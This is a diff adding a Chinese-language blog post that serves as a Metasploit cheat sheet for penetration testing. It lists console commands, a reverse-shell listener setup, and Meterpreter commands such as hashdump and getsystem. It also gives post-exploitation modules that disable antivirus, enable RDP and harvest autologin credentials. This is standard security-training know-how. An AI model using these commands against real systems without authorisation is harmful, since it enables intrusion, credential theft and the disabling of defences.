@@ -1,0 +1,361 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="工具使用MSF常用参数命令： reload_all #从目录重载所有模块 back #后退命令，移出当前上下文，用于模块切换 info #目标和模块详细信息 check #检查目标是否受某个漏洞影响 sessions #会话管理 sessions -l #列出所有会话 sessions -K #终止所有会话 sessions -i id #进入某个会话 sessions -v #以详细模式列出会话">
+<meta property="og:type" content="article">
+<meta property="og:title" content="msf常用命令">
+<meta property="og:url" content="https://xbayli.github.io/2022/07/05/msf%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/index.html">
+<meta property="og:site_name" content="Wanna fly">
+<meta property="og:description" content="工具使用MSF常用参数命令： reload_all #从目录重载所有模块 back #后退命令，移出当前上下文，用于模块切换 info #目标和模块详细信息 check #检查目标是否受某个漏洞影响 sessions #会话管理 sessions -l #列出所有会话 sessions -K #终止所有会话 sessions -i id #进入某个会话 sessions -v #以详细模式列出会话">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2022-07-05T05:19:15.000Z">
+<meta property="article:modified_time" content="2022-07-05T05:24:09.538Z">
+<meta property="article:author" content="hepay">
+<meta property="article:tag" content="内网">
+<meta property="article:tag" content="MSF">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>msf常用命令</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.2.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tags</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/link/">Uselink</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2022/07/05/cs-msf%E8%81%94%E5%8A%A8/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2022/07/05/%E9%9A%A7%E9%81%93%E4%BB%A3%E7%90%86%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://xbayli.github.io/2022/07/05/msf%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://xbayli.github.io/2022/07/05/msf%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/&text=msf常用命令"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://xbayli.github.io/2022/07/05/msf%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/&title=msf常用命令"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://xbayli.github.io/2022/07/05/msf%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/&is_video=false&description=msf常用命令"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=msf常用命令&body=Check out this article: https://xbayli.github.io/2022/07/05/msf%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://xbayli.github.io/2022/07/05/msf%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/&title=msf常用命令"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://xbayli.github.io/2022/07/05/msf%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/&title=msf常用命令"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://xbayli.github.io/2022/07/05/msf%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/&title=msf常用命令"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://xbayli.github.io/2022/07/05/msf%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/&title=msf常用命令"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://xbayli.github.io/2022/07/05/msf%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/&name=msf常用命令&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://xbayli.github.io/2022/07/05/msf%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/&t=msf常用命令"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8"><span class="toc-number">1.</span> <span class="toc-text">工具使用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0%E5%91%BD%E4%BB%A4%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">MSF常用参数命令：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%AD%A5%E9%AA%A4%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">MSF漏洞利用步骤：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF%E7%9B%91%E5%90%AC%E5%8F%8D%E5%BC%B9shell%EF%BC%9A"><span class="toc-number">1.3.</span> <span class="toc-text">MSF监听反弹shell：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Meterpreter%E5%91%BD%E4%BB%A4%EF%BC%9A"><span class="toc-number">1.4.</span> <span class="toc-text">Meterpreter命令：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF%E5%90%8E%E6%B8%97%E9%80%8F%E5%91%BD%E4%BB%A4%EF%BC%9A"><span class="toc-number">1.5.</span> <span class="toc-text">MSF后渗透命令：</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        msf常用命令
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">hepay</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2022-07-05T05:19:15.000Z" itemprop="datePublished">2022-07-05</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/MSF/" rel="tag">MSF</a>, <a class="tag-link-link" href="/tags/%E5%86%85%E7%BD%91/" rel="tag">内网</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h3 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h3><h4 id="MSF常用参数命令："><a href="#MSF常用参数命令：" class="headerlink" title="MSF常用参数命令："></a>MSF常用参数命令：</h4><ul>
+<li>reload_all #从目录重载所有模块</li>
+<li>back #后退命令，移出当前上下文，用于模块切换</li>
+<li>info #目标和模块详细信息</li>
+<li>check #检查目标是否受某个漏洞影响</li>
+<li>sessions #会话管理</li>
+<li>sessions -l #列出所有会话</li>
+<li>sessions -K #终止所有会话</li>
+<li>sessions -i id #进入某个会话</li>
+<li>sessions -v #以详细模式列出会话</li>
+<li>sessions -u #在许多平台上将shell升级到meterpreter会话</li>
+<li>show options #显示可选选项；</li>
+</ul>
+<h4 id="MSF漏洞利用步骤："><a href="#MSF漏洞利用步骤：" class="headerlink" title="MSF漏洞利用步骤："></a>MSF漏洞利用步骤：</h4><ul>
+<li>search xxx #搜索某个漏洞</li>
+<li>use xxx #使用某个漏洞利用模块</li>
+<li>show options #查看配置选项</li>
+<li>set payload #配置攻击载荷</li>
+<li>exploit&#x2F;run #执行渗透攻击</li>
+</ul>
+<h4 id="MSF监听反弹shell："><a href="#MSF监听反弹shell：" class="headerlink" title="MSF监听反弹shell："></a>MSF监听反弹shell：</h4><ul>
+<li>msf6 &gt; use exploit&#x2F;multi&#x2F;handler</li>
+<li>msf6 exploit(multi&#x2F;handler) &gt; set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</li>
+<li>msf6 exploit(multi&#x2F;handler) &gt; set LHOST 0.0.0.0</li>
+<li>msf6 exploit(multi&#x2F;handler) &gt; set LPORT 4444</li>
+<li>msf6 exploit(multi&#x2F;handler) &gt; run</li>
+</ul>
+<h4 id="Meterpreter命令："><a href="#Meterpreter命令：" class="headerlink" title="Meterpreter命令："></a>Meterpreter命令：</h4><ul>
+<li>pwd、ls、cd、ps、cat #通用命令</li>
+<li>background #将当前meterpreter会话隐藏在后台sessions中</li>
+<li>getpid #查看当前Meterpreter Shell的进程号</li>
+<li>getuid #查看当前权限</li>
+<li>migrate 476 #将shell迁移到PID为786的进程中</li>
+<li>getsystem #获得系统管理员权限（要本地管理员权限运行）</li>
+<li>hashdump #抓哈希密码</li>
+<li>sysinfo #查看系统信息</li>
+<li>route #查看目标机完整网络设置</li>
+<li>shell #进入目标机shell，exit退出shell</li>
+<li>upload .&#x2F;1.txt c:\1.txt #上传文件</li>
+<li>download c:\1.txt .&#x2F; #下载文件</li>
+<li>search -f *.txt -d c:&#x2F;&#x2F; #搜索文件</li>
+</ul>
+<h4 id="MSF后渗透命令："><a href="#MSF后渗透命令：" class="headerlink" title="MSF后渗透命令："></a>MSF后渗透命令：</h4><ul>
+<li>run post&#x2F;windows&#x2F;gather&#x2F;checkvm #查看目标是否允许在虚拟机</li>
+<li>run post&#x2F;windows&#x2F;manage&#x2F;killav #关闭杀毒软件</li>
+<li>run post&#x2F;windows&#x2F;manage&#x2F;enable_rdp #开启3389远程桌面</li>
+<li>run post&#x2F;windows&#x2F;manage&#x2F;autoroute #查看目标子网情况</li>
+<li>run post&#x2F;windows&#x2F;gather&#x2F;enum_logged_on_users #列举当前有多少用户登录过目标主机</li>
+<li>run post&#x2F;windows&#x2F;gather&#x2F;credentials&#x2F;windows_autologin #抓取自动登录的用户名密码</li>
+<li>run post&#x2F;windows&#x2F;gather&#x2F;enum_applications #列举应用程序</li>
+</ul>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">Home</a></li>
+         
+          <li><a href="/tags/">Tags</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+         
+          <li><a href="/link/">Uselink</a></li>
+         
+          <li><a href="/about/">About</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8"><span class="toc-number">1.</span> <span class="toc-text">工具使用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF%E5%B8%B8%E7%94%A8%E5%8F%82%E6%95%B0%E5%91%BD%E4%BB%A4%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">MSF常用参数命令：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%AD%A5%E9%AA%A4%EF%BC%9A"><span class="toc-number">1.2.</span> <span class="toc-text">MSF漏洞利用步骤：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF%E7%9B%91%E5%90%AC%E5%8F%8D%E5%BC%B9shell%EF%BC%9A"><span class="toc-number">1.3.</span> <span class="toc-text">MSF监听反弹shell：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Meterpreter%E5%91%BD%E4%BB%A4%EF%BC%9A"><span class="toc-number">1.4.</span> <span class="toc-text">Meterpreter命令：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#MSF%E5%90%8E%E6%B8%97%E9%80%8F%E5%91%BD%E4%BB%A4%EF%BC%9A"><span class="toc-number">1.5.</span> <span class="toc-text">MSF后渗透命令：</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://xbayli.github.io/2022/07/05/msf%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://xbayli.github.io/2022/07/05/msf%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/&text=msf常用命令"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://xbayli.github.io/2022/07/05/msf%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/&title=msf常用命令"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://xbayli.github.io/2022/07/05/msf%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/&is_video=false&description=msf常用命令"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=msf常用命令&body=Check out this article: https://xbayli.github.io/2022/07/05/msf%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://xbayli.github.io/2022/07/05/msf%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/&title=msf常用命令"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://xbayli.github.io/2022/07/05/msf%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/&title=msf常用命令"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://xbayli.github.io/2022/07/05/msf%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/&title=msf常用命令"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://xbayli.github.io/2022/07/05/msf%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/&title=msf常用命令"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://xbayli.github.io/2022/07/05/msf%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/&name=msf常用命令&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://xbayli.github.io/2022/07/05/msf%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/&t=msf常用命令"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2020-2022
+    hepay
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tags</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/link/">Uselink</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.2/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+ 
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script> 
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script> 
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
